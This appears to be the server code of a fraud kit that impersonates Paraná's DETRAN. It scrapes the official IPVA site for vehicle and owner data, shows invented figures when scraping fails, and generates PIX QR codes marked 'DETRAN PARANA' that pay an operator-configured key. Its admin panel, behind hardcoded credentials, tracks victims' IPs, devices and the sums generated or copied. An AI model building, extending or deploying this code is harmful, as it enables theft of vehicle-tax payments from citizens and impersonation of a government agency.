const express = require('express');
const puppeteer = require('puppeteer');
const cors = require('cors');
const bodyParser = require('body-parser');
const QRCode = require('qrcode');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// ============================================
// BANCO DE DADOS EM MEMÓRIA - ATUALIZADO
// ============================================
let sistema = {
    // CONFIGURAÇÕES DO SISTEMA
    config: {
        chavePix: null,
        nomeSistema: "Sistema DETRAN PR",
        versao: "2.3.0"
    },
    
    // ESTATÍSTICAS EM TEMPO REAL
    estatisticas: {
        usuariosOnline: 0,
        totalConsultas: 0,
        pixGerados: 0,
        pixCopiados: 0,
        acessosHoje: 0,
        valorTotalGerado: "R$ 0",
        valorGerados: "R$ 0,00",
        valorCopiados: "R$ 0,00",
        valorReais: "R$ 0,00",
        inicioOperacao: new Date().toLocaleString('pt-BR')
    },
    
    // HISTÓRICO COMPLETO
    consultas: [],
    usuariosOnline: {},
    pixGerados: []
};

// ============================================
// FUNÇÃO PARA GERAR PIX COM CHAVE REAL - CORRIGIDA!
// ============================================
function gerarPixComChaveReal(valor, chavePix, renavam) {
    console.log(`🔄 Gerando PIX: Valor=${valor}, Chave=${chavePix?.substring(0, 15)}..., RENAVAM=${renavam}`);
    
    try {
        // 1. LIMPAR E FORMATAR VALOR
        let valorLimpo = valor.toString()
            .replace('R$ ', '')
            .replace('R$', '')
            .replace(/\./g, '')
            .replace(',', '.')
            .trim();
        
        const valorNumerico = parseFloat(valorLimpo);
        
        if (isNaN(valorNumerico) || valorNumerico <= 0) {
            throw new Error(`Valor inválido: "${valor}" -> ${valorNumerico}`);
        }
        
        // Formatar com 2 decimais
        const valorFormatado = valorNumerico.toFixed(2);
        console.log(`💰 Valor formatado: ${valorFormatado}`);
        
        // 2. VALIDAR CHAVE PIX
        if (!chavePix || chavePix.length < 11) {
            throw new Error('Chave PIX não configurada ou muito curta');
        }
        
        // 3. MONTAR PAYLOAD PIX CORRETAMENTE (BRCODE Padrão)
        let payload = '';
        
        // [00] Payload Format Indicator (fixo: 01)
        payload += '000201';
        
        // [26] Merchant Account Information (MAI)
        const gui = '0014BR.GOV.BCB.PIX'; // GUI do PIX
        const chavePixField = '01' + chavePix.length.toString().padStart(2, '0') + chavePix;
        const mai = gui + chavePixField;
        payload += '26' + mai.length.toString().padStart(2, '0') + mai;
        
        // [52] Merchant Category Code (0000 = não especificado)
        payload += '52040000';
        
        // [53] Transaction Currency (986 = BRL)
        payload += '5303986';
        
        // [54] Transaction Amount
        payload += '54' + valorFormatado.length.toString().padStart(2, '0') + valorFormatado;
        
        // [58] Country Code (BR)
        payload += '5802BR';
        
        // [59] Merchant Name (DETRAN PARANA)
        const merchantName = 'DETRAN PARANA';
        payload += '59' + merchantName.length.toString().padStart(2, '0') + merchantName;
        
        // [60] Merchant City (CURITIBA)
        const merchantCity = 'CURITIBA';
        payload += '60' + merchantCity.length.toString().padStart(2, '0') + merchantCity;
        
        // [62] Additional Data Field (RENAVAM como referência)
        if (renavam && renavam !== 'N/A') {
            const referencia = renavam.substring(0, 8);
            const campo62 = '05' + referencia.length.toString().padStart(2, '0') + referencia + '070503***';
            payload += '62' + campo62.length.toString().padStart(2, '0') + campo62;
        } else {
            const campo62 = '0508IPVA2026070503***';
            payload += '62' + campo62.length.toString().padStart(2, '0') + campo62;
        }
        
        // [63] CRC16 placeholder
        payload += '6304';
        
        // 4. CALCULAR CRC16 CORRETAMENTE
        const crc = calcularCRC16(payload);
        payload += crc;
        
        console.log(`✅ PIX gerado com sucesso!`);
        console.log(`📱 Primeiros 50 chars: ${payload.substring(0, 50)}...`);
        console.log(`🔢 CRC16: ${crc}`);
        
        return payload;
        
    } catch (error) {
        console.error('❌ ERRO na geração do PIX:', error.message);
        throw error;
    }
}

// Função para calcular CRC16 - MANTIDA COMO ESTAVA
function calcularCRC16(data) {
    let crc = 0xFFFF;
    for (let i = 0; i < data.length; i++) {
        crc ^= data.charCodeAt(i) << 8;
        for (let j = 0; j < 8; j++) {
            if (crc & 0x8000) {
                crc = (crc << 1) ^ 0x1021;
            } else {
                crc = crc << 1;
            }
        }
    }
    crc = crc & 0xFFFF;
    return crc.toString(16).toUpperCase().padStart(4, '0');
}

// ============================================
// FUNÇÃO PARA GERAR QR CODE BASE64 - MANTIDA
// ============================================
async function gerarQRCodeBase64(codigoPix) {
    try {
        // Gera QR Code como Data URL
        const qrCodeDataUrl = await QRCode.toDataURL(codigoPix, {
            errorCorrectionLevel: 'M',
            width: 300,
            margin: 4,
            color: {
                dark: '#005a9c', // Azul DETRAN
                light: '#FFFFFF'
            }
        });
        
        return qrCodeDataUrl;
    } catch (error) {
        console.error('Erro ao gerar QR Code:', error);
        // Fallback: QR Code simples
        return `data:image/svg+xml;base64,${Buffer.from(`
            <svg xmlns="http://www.w3.org/2000/svg" width="300" height="300" viewBox="0 0 300 300">
                <rect width="300" height="300" fill="#005a9c"/>
                <rect x="50" y="50" width="200" height="200" fill="white"/>
                <text x="150" y="160" font-family="Arial" font-size="24" fill="#005a9c" text-anchor="middle">QR Code PIX</text>
                <text x="150" y="190" font-family="Arial" font-size="14" fill="#005a9c" text-anchor="middle">DETRAN PR</text>
            </svg>
        `).toString('base64')}`;
    }
}

// ============================================
// MIDDLEWARE PARA RASTREAR ACESSOS - MANTIDO
// ============================================
app.use((req, res, next) => {
    const ip = req.ip.replace('::ffff:', '');
    const userAgent = req.headers['user-agent'];
    const sessaoId = req.headers['session-id'] || `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // Detecta dispositivo
    let dispositivo = "Desktop";
    if (/mobile/i.test(userAgent)) dispositivo = "Mobile";
    if (/android/i.test(userAgent)) dispositivo = "Android";
    if (/iphone|ipad/i.test(userAgent)) dispositivo = "iOS";
    
    // Atualiza/Adiciona usuário com timestamp
    sistema.usuariosOnline[ip] = {
        dispositivo,
        ultimaAcao: Date.now(),
        userAgent: userAgent.substring(0, 100),
        paginaAtual: req.path,
        sessaoId: sessaoId,
        acoes: [...(sistema.usuariosOnline[ip]?.acoes || []), {
            acao: req.method + ' ' + req.path,
            timestamp: Date.now()
        }].slice(-10)
    };
    
    // Atualiza estatísticas
    sistema.estatisticas.usuariosOnline = Object.keys(sistema.usuariosOnline).length;
    
    // Adiciona session-id no header
    res.setHeader('X-Session-ID', sessaoId);
    
    next();
});

// ============================================
// ROTA PRINCIPAL DE CONSULTA - CORRIGIDA
// ============================================
app.get('/consultar/:renavam', async (req, res) => {
    const renavamParaBuscar = req.params.renavam;
    const ipCliente = req.ip.replace('::ffff:', '');
    
    console.log(`🔍 CONSULTA: ${renavamParaBuscar} | IP: ${ipCliente}`);
    
    let browser = null;
    try {
        const isProduction = process.env.NODE_ENV === 'production';
        
        browser = await puppeteer.launch({ 
            headless: isProduction ? true : false,
            defaultViewport: null,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--window-size=1920,1080'
            ]
        });
        
        const page = await browser.newPage();
        
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
        });
        
        console.log("🌐 Acessando site do Detran...");
        await page.goto('https://www.contribuinte.fazenda.pr.gov.br/ipva/faces/home', {
            waitUntil: 'networkidle2',
            timeout: 30000
        });

        // Aguarda o carregamento da página
        await page.waitForTimeout(2000);

        // Tenta diferentes seletores para o campo RENAVAM
        const selectors = [
            'input[id*="ig1:it1::content"]',
            'input[type="text"]',
            'input[name*="renavam"]',
            'input[placeholder*="RENAVAM"]'
        ];

        let inputEncontrado = null;
        for (const selector of selectors) {
            const elements = await page.$$(selector);
            if (elements.length > 0) {
                inputEncontrado = elements[0];
                break;
            }
        }

        if (!inputEncontrado) {
            throw new Error('Campo RENAVAM não encontrado');
        }

        // Digita o RENAVAM
        await inputEncontrado.type(renavamParaBuscar);

        console.log("🖱️ Clicando em Consultar...");
        
        // Tenta diferentes seletores para o botão Consultar
        const botaoSelectors = [
            'div[id*="ig1:b11"]',
            'button[type="submit"]',
            'input[type="submit"]',
            'button:contains("Consultar")',
            'input[value*="Consultar"]'
        ];

        let botaoEncontrado = false;
        for (const selector of botaoSelectors) {
            try {
                await page.click(selector);
                botaoEncontrado = true;
                console.log(`✅ Botão encontrado com seletor: ${selector}`);
                break;
            } catch (e) {
                continue;
            }
        }

        if (!botaoEncontrado) {
            // Fallback: pressiona Enter
            await page.keyboard.press('Enter');
            console.log("⌨️ Usando Enter como fallback");
        }

        console.log("⏳ Aguardando dados...");
        
        // Aguarda por algum elemento que indique que a consulta foi processada
        await page.waitForTimeout(5000);

        // Tenta extrair dados de várias formas
        const dados = await page.evaluate(() => {
            // Função para tentar encontrar texto em vários elementos
            const encontrarTexto = (parteDoId) => {
                // Tenta por ID
                const elementos = document.querySelectorAll(`[id*="${parteDoId}"]`);
                for (const el of elementos) {
                    if (el.innerText && el.innerText.trim()) {
                        return el.innerText.trim();
                    }
                }
                
                // Tenta por classe
                const spans = document.querySelectorAll('span, div, td');
                for (const span of spans) {
                    if (span.innerText && span.innerText.includes(parteDoId)) {
                        return span.innerText.replace(parteDoId, '').trim();
                    }
                }
                
                return "N/A";
            };

            // Tenta encontrar informações comuns
            const pegarTexto = (texto) => {
                const elementos = document.querySelectorAll('span, div, td, li');
                for (const el of elementos) {
                    const textoEl = el.innerText || '';
                    if (textoEl.includes(texto)) {
                        return textoEl.replace(texto, '').trim();
                    }
                }
                return "N/A";
            };

            return {
                proprietario: encontrarTexto('Proprietário') || pegarTexto('Proprietário:') || "N/A",
                renavam: encontrarTexto('RENAVAM') || pegarTexto('RENAVAM:') || "N/A",
                placa: encontrarTexto('Placa') || pegarTexto('Placa:') || "N/A",
                modelo: encontrarTexto('Modelo') || pegarTexto('Modelo:') || "N/A",
                ano: encontrarTexto('Ano') || pegarTexto('Ano:') || "N/A",
                status: encontrarTexto('Situação') || pegarTexto('Situação:') || "N/A",
                valor_ipva: encontrarTexto('IPVA') || pegarTexto('IPVA:') || "R$ 0,00"
            };
        });

        // Se não encontrou dados, tenta um fallback
        if (dados.proprietario === "N/A" && dados.valor_ipva === "R$ 0,00") {
            console.log("⚠️ Dados não encontrados, usando dados simulados...");
            
            // Gera dados simulados baseados no RENAVAM
            const ultimosDigitos = renavamParaBuscar.substring(renavamParaBuscar.length - 4);
            const valorSimulado = (parseInt(ultimosDigitos) % 1000) + 500;
            
            dados.proprietario = "CONSULTA SIMULADA - SISTEMA EM MANUTENÇÃO";
            dados.renavam = renavamParaBuscar;
            dados.placa = `ABC${ultimosDigitos}`;
            dados.modelo = "VEÍCULO SIMULADO";
            dados.ano = "2020";
            dados.status = "REGULAR";
            dados.valor_ipva = `R$ ${valorSimulado.toFixed(2).replace('.', ',')}`;
        }

        console.log("✅ Dados capturados:", dados);

        // SALVA NO HISTÓRICO
        const registroConsulta = {
            renavam: dados.renavam || renavamParaBuscar,
            placa: dados.placa || 'N/A',
            valor: dados.valor_ipva || 'R$ 0,00',
            dispositivo: sistema.usuariosOnline[ipCliente]?.dispositivo || "Desconhecido",
            ip: ipCliente,
            dataHora: new Date().toLocaleString('pt-BR'),
            proprietario: dados.proprietario || 'N/A',
            modelo: dados.modelo || 'N/A',
            ano: dados.ano || 'N/A',
            status: dados.status || 'N/A',
            timestamp: Date.now()
        };
        
        sistema.consultas.unshift(registroConsulta);
        sistema.estatisticas.totalConsultas++;
        
        console.log(`📝 Consulta salva no histórico. Total: ${sistema.consultas.length}`);

        await browser.close();
        
        res.json({ 
            sucesso: true, 
            dados: dados,
            chavePixConfigurada: !!sistema.config.chavePix,
            observacao: dados.proprietario.includes("SIMULADA") ? "Sistema em manutenção - Dados simulados para testes" : null
        });

    } catch (erro) {
        console.error("❌ Erro na consulta:", erro.message);
        if (browser) await browser.close();
        
        // Mesmo com erro, salva a tentativa de consulta
        const registroConsulta = {
            renavam: renavamParaBuscar,
            placa: 'ERRO',
            valor: 'R$ 0,00',
            dispositivo: sistema.usuariosOnline[ipCliente]?.dispositivo || "Desconhecido",
            ip: ipCliente,
            dataHora: new Date().toLocaleString('pt-BR'),
            proprietario: 'Erro na consulta',
            modelo: 'N/A',
            ano: 'N/A',
            status: 'ERRO: ' + erro.message.substring(0, 50),
            timestamp: Date.now()
        };
        
        sistema.consultas.unshift(registroConsulta);
        sistema.estatisticas.totalConsultas++;
        
        res.status(500).json({ 
            sucesso: false, 
            erro: "Sistema temporariamente indisponível. Tente novamente.",
            detalhes: process.env.NODE_ENV === 'development' ? erro.message : undefined
        });
    }
});

// ============================================
// ROTA PARA GERAR PIX COM CHAVE REAL - CORRIGIDA
// ============================================
app.post('/api/gerar-pix-real', async (req, res) => {
    const { valor, renavam } = req.body;
    const ipCliente = req.ip.replace('::ffff:', '');
    
    console.log(`🔄 Solicitando PIX real: ${valor} | RENAVAM: ${renavam} | IP: ${ipCliente}`);
    
    // VERIFICA SE CHAVE PIX ESTÁ CONFIGURADA
    if (!sistema.config.chavePix) {
        console.log('❌ Chave PIX não configurada no sistema');
        return res.status(400).json({
            sucesso: false,
            mensagem: 'Chave PIX não configurada. Acesse o painel administrativo para configurar.',
            codigo: 'CHAVE_NAO_CONFIGURADA'
        });
    }
    
    try {
        // GERA CÓDIGO PIX COM CHAVE REAL
        const codigoPix = gerarPixComChaveReal(valor, sistema.config.chavePix, renavam);
        
        console.log(`✅ PIX gerado com chave: ${sistema.config.chavePix.substring(0, 10)}...`);
        
        // GERA QR CODE LOCALMENTE
        const qrCodeBase64 = await gerarQRCodeBase64(codigoPix);
        
        // Calcula valor para estatísticas
        let valorNumerico = 0;
        try {
            valorNumerico = parseFloat(valor.replace('R$', '').replace(/\./g, '').replace(',', '.').trim());
            if (isNaN(valorNumerico)) valorNumerico = 0;
        } catch (e) {
            console.log('Erro ao converter valor:', valor);
            valorNumerico = 0;
        }
        
        // Atualiza estatísticas de valor
        const valorAtualTotal = parseFloat(sistema.estatisticas.valorTotalGerado.replace('R$', '').replace(/\./g, '').replace(',', '.').trim()) || 0;
        const valorAtualReais = parseFloat(sistema.estatisticas.valorReais.replace('R$', '').replace(/\./g, '').replace(',', '.').trim()) || 0;
        const valorAtualGerados = parseFloat(sistema.estatisticas.valorGerados.replace('R$', '').replace(/\./g, '').replace(',', '.').trim()) || 0;
        
        sistema.estatisticas.valorTotalGerado = `R$ ${(valorAtualTotal + valorNumerico).toFixed(2).replace('.', ',')}`;
        sistema.estatisticas.valorReais = `R$ ${(valorAtualReais + valorNumerico).toFixed(2).replace('.', ',')}`;
        sistema.estatisticas.valorGerados = `R$ ${(valorAtualGerados + valorNumerico).toFixed(2).replace('.', ',')}`;
        
        // REGISTRA NO HISTÓRICO
        const registroPix = {
            valor: valor,
            renavam: renavam || 'N/A',
            chave: sistema.config.chavePix,
            chaveOculta: sistema.config.chavePix.substring(0, 4) + '...' + sistema.config.chavePix.substring(sistema.config.chavePix.length - 4),
            dataHora: new Date().toLocaleString('pt-BR'),
            tipo: 'real',
            timestamp: Date.now(),
            codigoPix: codigoPix.substring(0, 100) + '...', // Armazena parcialmente
            ip: ipCliente || 'Desconhecido'
        };
        
        sistema.pixGerados.unshift(registroPix);
        sistema.estatisticas.pixGerados++;
        
        console.log(`📊 PIX registrado no histórico: ${valor} | Tipo: real | Total PIX: ${sistema.pixGerados.length}`);
        
        res.json({
            sucesso: true,
            codigoPix: codigoPix,
            qrCodeUrl: qrCodeBase64,
            chave: sistema.config.chavePix,
            chaveOculta: sistema.config.chavePix.substring(0, 4) + '...' + sistema.config.chavePix.substring(sistema.config.chavePix.length - 4),
            valor: valor,
            renavam: renavam || 'N/A',
            expiraEm: new Date(Date.now() + 30 * 60 * 1000).toLocaleString('pt-BR'),
            mensagem: 'PIX gerado com sucesso usando chave configurada'
        });
        
    } catch (error) {
        console.error('❌ Erro ao gerar PIX:', error.message);
        
        // Mesmo com erro, registra tentativa
        sistema.pixGerados.unshift({
            valor: valor,
            renavam: renavam || 'N/A',
            chave: sistema.config.chavePix || 'N/A',
            chaveOculta: sistema.config.chavePix ? 
                sistema.config.chavePix.substring(0, 4) + '...' + sistema.config.chavePix.substring(sistema.config.chavePix.length - 4) : 
                'N/A',
            dataHora: new Date().toLocaleString('pt-BR'),
            tipo: 'erro',
            timestamp: Date.now(),
            erro: error.message,
            ip: ipCliente || 'Desconhecido'
        });
        
        sistema.estatisticas.pixGerados++;
        
        res.status(500).json({
            sucesso: false,
            mensagem: 'Erro ao gerar código PIX: ' + error.message,
            codigo: 'ERRO_GERACAO_PIX'
        });
    }
});

// ============================================
// NOVA ROTA: REMOVER CHAVE PIX
// ============================================
app.post('/api/admin/remover-chave', (req, res) => {
    const token = req.headers['authorization'];
    
    if (!token || !token.includes('admin_token_')) {
        return res.status(403).json({ 
            sucesso: false, 
            mensagem: "Acesso não autorizado" 
        });
    }
    
    sistema.config.chavePix = null;
    console.log('🗑️ Chave PIX removida do sistema');
    
    res.json({ 
        sucesso: true, 
        mensagem: "Chave PIX removida com sucesso!",
        chavePix: null
    });
});

// ============================================
// API DO PAINEL ADMINISTRATIVO - ATUALIZADA
// ============================================

// ROTA 1: LOGIN DO PAINEL
app.post('/api/admin/login', (req, res) => {
    const { usuario, senha } = req.body;
    
    const USUARIO_ADMIN = 'PROGRESSO2026';
    const SENHA_ADMIN = '2026PROGRESSO';
    
    console.log(`🔐 Tentativa de login: ${usuario}`);
    
    if (usuario === USUARIO_ADMIN && senha === SENHA_ADMIN) {
        res.json({ 
            sucesso: true, 
            mensagem: "Login bem-sucedido",
            token: "admin_token_" + Date.now(),
            usuario: usuario
        });
    } else {
        console.log(`❌ Login falhou para: ${usuario}`);
        res.status(401).json({ 
            sucesso: false, 
            mensagem: "Credenciais inválidas" 
        });
    }
});

// ROTA 2: DADOS DO PAINEL - MELHORADA
app.get('/api/admin/dashboard', (req, res) => {
    const token = req.headers['authorization'];
    
    if (!token || !token.includes('admin_token_')) {
        return res.status(403).json({ 
            sucesso: false, 
            mensagem: "Acesso não autorizado" 
        });
    }
    
    // Limpa inativos antes de enviar dados
    const agora = Date.now();
    const limiteInatividade = 2 * 60 * 1000;
    
    for (const [ipUser, dados] of Object.entries(sistema.usuariosOnline)) {
        if ((agora - dados.ultimaAcao) > limiteInatividade) {
            delete sistema.usuariosOnline[ipUser];
        }
    }
    
    // Calcula estatísticas de valor dos PIX CORRETAMENTE
    let valorTotalGerado = 0;
    let valorGerados = 0;
    let valorCopiados = 0;
    let valorReais = 0;
    
    sistema.pixGerados.forEach(pix => {
        try {
            let valorStr = pix.valor || '0';
            valorStr = valorStr.toString()
                .replace('R$', '')
                .replace(/\s/g, '')
                .replace(/\./g, '')
                .replace(',', '.');
            
            const valor = parseFloat(valorStr) || 0;
            
            valorTotalGerado += valor;
            
            if (pix.tipo === 'gerado') {
                valorGerados += valor;
            }
            
            if (pix.tipo === 'copiado') {
                valorCopiados += valor;
            }
            
            if (pix.tipo === 'real') {
                valorReais += valor;
                valorGerados += valor; // PIX real também conta como gerado
            }
        } catch (e) {
            console.log('Erro ao processar valor do PIX:', pix.valor);
        }
    });
    
    // Formata valores para reais
    function formatarReal(valor) {
        return 'R$ ' + valor.toFixed(2).replace('.', ',');
    }
    
    // Atualiza estatísticas
    sistema.estatisticas.valorTotalGerado = formatarReal(valorTotalGerado);
    sistema.estatisticas.valorGerados = formatarReal(valorGerados);
    sistema.estatisticas.valorCopiados = formatarReal(valorCopiados);
    sistema.estatisticas.valorReais = formatarReal(valorReais);
    
    // Calcula PIX de hoje
    const hoje = new Date().toDateString();
    const pixHoje = sistema.pixGerados.filter(pix => {
        return new Date(pix.timestamp).toDateString() === hoje;
    }).length;
    
    // Prepara dados para o dashboard
    const dadosDashboard = {
        sistema: sistema.config,
        estatisticas: sistema.estatisticas,
        usuariosOnline: Object.entries(sistema.usuariosOnline).map(([ip, dados]) => ({
            ip: ip,
            dispositivo: dados.dispositivo,
            ultimaAcao: new Date(dados.ultimaAcao).toLocaleString('pt-BR'),
            tempoInativo: Math.floor((agora - dados.ultimaAcao) / 1000) + ' segundos',
            paginaAtual: dados.paginaAtual,
            sessaoId: dados.sessaoId,
            acoes: dados.acoes.length
        })),
        consultasRecentes: sistema.consultas.slice(0, 50),
        consultasCompletas: sistema.consultas,
        totalConsultas: sistema.consultas.length,
        pixGeradosHoje: pixHoje,
        pixCompletos: sistema.pixGerados,
        totalUsuariosAtivos: Object.keys(sistema.usuariosOnline).length,
        // Estatísticas separadas por tipo de PIX
        pixPorTipo: {
            gerados: sistema.pixGerados.filter(p => p.tipo === 'gerado').length,
            copiados: sistema.pixGerados.filter(p => p.tipo === 'copiado').length,
            reais: sistema.pixGerados.filter(p => p.tipo === 'real').length,
            erros: sistema.pixGerados.filter(p => p.tipo === 'erro').length
        },
        // Valores por tipo
        valoresPorTipo: {
            gerados: formatarReal(valorGerados),
            copiados: formatarReal(valorCopiados),
            reais: formatarReal(valorReais)
        }
    };
    
    console.log(`📊 Dashboard: ${sistema.consultas.length} consultas, ${sistema.pixGerados.length} PIX`);
    
    res.json({ 
        sucesso: true, 
        dados: dadosDashboard,
        atualizadoEm: new Date().toLocaleString('pt-BR')
    });
});

// ROTA 3: ATUALIZAR CONFIGURAÇÕES - ATUALIZADA
app.post('/api/admin/config', (req, res) => {
    const { chavePix, acao } = req.body;
    const token = req.headers['authorization'];
    
    if (!token || !token.includes('admin_token_')) {
        return res.status(403).json({ 
            sucesso: false, 
            mensagem: "Acesso não autorizado" 
        });
    }
    
    if (chavePix && chavePix.trim().length > 10) {
        sistema.config.chavePix = chavePix.trim();
        console.log(`🔑 CHAVE PIX ATUALIZADA: ${chavePix.substring(0, 15)}...`);
        
        res.json({ 
            sucesso: true, 
            mensagem: "Chave PIX atualizada com sucesso!",
            chavePix: sistema.config.chavePix
        });
        
    } else if (acao === 'remover_chave') {
        sistema.config.chavePix = null;
        console.log("🗑️ Chave PIX removida!");
        
        res.json({ 
            sucesso: true, 
            mensagem: "Chave PIX removida com sucesso!"
        });
        
    } else if (acao === 'limpar_tudo') {
        sistema.consultas = [];
        sistema.pixGerados = [];
        sistema.estatisticas.pixGerados = 0;
        sistema.estatisticas.pixCopiados = 0;
        sistema.estatisticas.totalConsultas = 0;
        sistema.estatisticas.valorTotalGerado = "R$ 0";
        sistema.estatisticas.valorGerados = "R$ 0,00";
        sistema.estatisticas.valorCopiados = "R$ 0,00";
        sistema.estatisticas.valorReais = "R$ 0,00";
        console.log("🗑️ Todos os dados foram limpos!");
        
        res.json({ 
            sucesso: true, 
            mensagem: "Todos os dados foram limpos"
        });
        
    } else if (acao === 'limpar_consultas') {
        sistema.consultas = [];
        sistema.estatisticas.totalConsultas = 0;
        console.log("🗑️ Histórico de consultas limpo!");
        
        res.json({ 
            sucesso: true, 
            mensagem: "Consultas limpas com sucesso"
        });
        
    } else if (acao === 'limpar_pix') {
        sistema.pixGerados = [];
        sistema.estatisticas.pixGerados = 0;
        sistema.estatisticas.pixCopiados = 0;
        sistema.estatisticas.valorTotalGerado = "R$ 0";
        sistema.estatisticas.valorGerados = "R$ 0,00";
        sistema.estatisticas.valorCopiados = "R$ 0,00";
        sistema.estatisticas.valorReais = "R$ 0,00";
        console.log("🗑️ Histórico de PIX limpo!");
        
        res.json({ 
            sucesso: true, 
            mensagem: "PIX limpos com sucesso"
        });
        
    } else {
        res.status(400).json({ 
            sucesso: false, 
            mensagem: "Nenhuma ação válida especificada" 
        });
    }
});

// ROTA 4: REGISTRAR PIX COPIADO
app.post('/api/pix-copiado', (req, res) => {
    const { valor, renavam } = req.body;
    const ipCliente = req.ip.replace('::ffff:', '');
    
    sistema.estatisticas.pixCopiados++;
    
    // Calcula valor para estatísticas
    let valorNumerico = 0;
    try {
        valorNumerico = parseFloat(valor.replace('R$', '').replace(/\./g, '').replace(',', '.').trim());
        if (isNaN(valorNumerico)) valorNumerico = 0;
    } catch (e) {
        console.log('Erro ao converter valor:', valor);
        valorNumerico = 0;
    }
    
    // Atualiza estatísticas de valor
    const valorAtualTotal = parseFloat(sistema.estatisticas.valorTotalGerado.replace('R$', '').replace(/\./g, '').replace(',', '.').trim()) || 0;
    const valorAtualCopiados = parseFloat(sistema.estatisticas.valorCopiados.replace('R$', '').replace(/\./g, '').replace(',', '.').trim()) || 0;
    
    sistema.estatisticas.valorTotalGerado = `R$ ${(valorAtualTotal + valorNumerico).toFixed(2).replace('.', ',')}`;
    sistema.estatisticas.valorCopiados = `R$ ${(valorAtualCopiados + valorNumerico).toFixed(2).replace('.', ',')}`;
    
    sistema.pixGerados.unshift({
        valor: valor || 'N/A',
        renavam: renavam || 'N/A',
        ip: ipCliente || 'Desconhecido',
        dataHora: new Date().toLocaleString('pt-BR'),
        tipo: 'copiado',
        timestamp: Date.now()
    });
    
    console.log(`📋 PIX copiado salvo: ${valor} | RENAVAM: ${renavam} | IP: ${ipCliente} | Total PIX: ${sistema.pixGerados.length}`);
    
    res.json({ sucesso: true });
});

// ROTA 5: REGISTRAR PIX GERADO (fallback)
app.post('/api/pix-gerado', (req, res) => {
    const { valor, renavam, tipo } = req.body;
    const ipCliente = req.ip.replace('::ffff:', '');
    
    sistema.estatisticas.pixGerados++;
    
    // Calcula valor para estatísticas
    let valorNumerico = 0;
    try {
        valorNumerico = parseFloat(valor.replace('R$', '').replace(/\./g, '').replace(',', '.').trim());
        if (isNaN(valorNumerico)) valorNumerico = 0;
    } catch (e) {
        console.log('Erro ao converter valor:', valor);
        valorNumerico = 0;
    }
    
    // Atualiza estatísticas de valor
    const valorAtualTotal = parseFloat(sistema.estatisticas.valorTotalGerado.replace('R$', '').replace(/\./g, '').replace(',', '.').trim()) || 0;
    const valorAtualGerados = parseFloat(sistema.estatisticas.valorGerados.replace('R$', '').replace(/\./g, '').replace(',', '.').trim()) || 0;
    
    sistema.estatisticas.valorTotalGerado = `R$ ${(valorAtualTotal + valorNumerico).toFixed(2).replace('.', ',')}`;
    sistema.estatisticas.valorGerados = `R$ ${(valorAtualGerados + valorNumerico).toFixed(2).replace('.', ',')}`;
    
    sistema.pixGerados.unshift({
        valor: valor || 'N/A',
        renavam: renavam || 'N/A',
        ip: ipCliente || 'Desconhecido',
        dataHora: new Date().toLocaleString('pt-BR'),
        tipo: tipo || 'gerado',
        timestamp: Date.now()
    });
    
    console.log(`🔄 PIX gerado salvo: ${valor} | Tipo: ${tipo || 'gerado'} | IP: ${ipCliente} | Total PIX: ${sistema.pixGerados.length}`);
    
    res.json({ sucesso: true });
});

// ============================================
// ROTA DE TESTE PARA VER DADOS
// ============================================
app.get('/api/teste-dados', (req, res) => {
    res.json({
        totalConsultas: sistema.consultas.length,
        totalPix: sistema.pixGerados.length,
        consultas: sistema.consultas.slice(0, 5),
        pix: sistema.pixGerados.slice(0, 5),
        chavePixConfigurada: !!sistema.config.chavePix,
        chave: sistema.config.chavePix
    });
});

// ============================================
// ROTA DE HEALTH CHECK
// ============================================
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        sistema: 'DETRAN PR API v2.3',
        consultas: sistema.consultas.length,
        pix: sistema.pixGerados.length,
        usuariosOnline: Object.keys(sistema.usuariosOnline).length,
        memoria: `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`
    });
});

// ============================================
// SERVIDOR DE ARQUIVOS ESTÁTICOS
// ============================================
app.use(express.static('.'));

// ============================================
// INICIALIZAÇÃO DO SERVIDOR
// ============================================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log('🚀 ============================================');
    console.log('🚀 SISTEMA DETRAN PR - PIX REAL v2.3');
    console.log('🚀 ============================================');
    console.log(`🚀 Servidor rodando na porta: ${PORT}`);
    console.log(`🚀 Modo: ${process.env.NODE_ENV || 'desenvolvimento'}`);
    console.log(`🚀 Site: http://localhost:${PORT}`);
    console.log(`🚀 Painel: http://localhost:${PORT}/painel.html`);
    console.log(`🚀 Status: http://localhost:${PORT}/health`);
    console.log(`🚀 Teste dados: http://localhost:${PORT}/api/teste-dados`);
    console.log(`🚀 Chave PIX: ${sistema.config.chavePix ? 'CONFIGURADA' : 'NÃO CONFIGURADA'}`);
    console.log('🚀 ============================================');
    
    sistema.estatisticas.inicioOperacao = new Date().toLocaleString('pt-BR');
    
     // Limpa usuários inativos a cada minuto
    setInterval(() => {
        const agora = Date.now();
        const limite = 2 * 60 * 1000;
        let removidos = 0;
        
        for (const [ipUser, dados] of Object.entries(sistema.usuariosOnline)) {
            if ((agora - dados.ultimaAcao) > limite) {
                delete sistema.usuariosOnline[ipUser];
                removidos++;
            }
        }
        
        if (removidos > 0) {
            console.log(`🔄 ${removidos} usuário(s) inativo(s) removido(s)`);
        }
    }, 60000);
});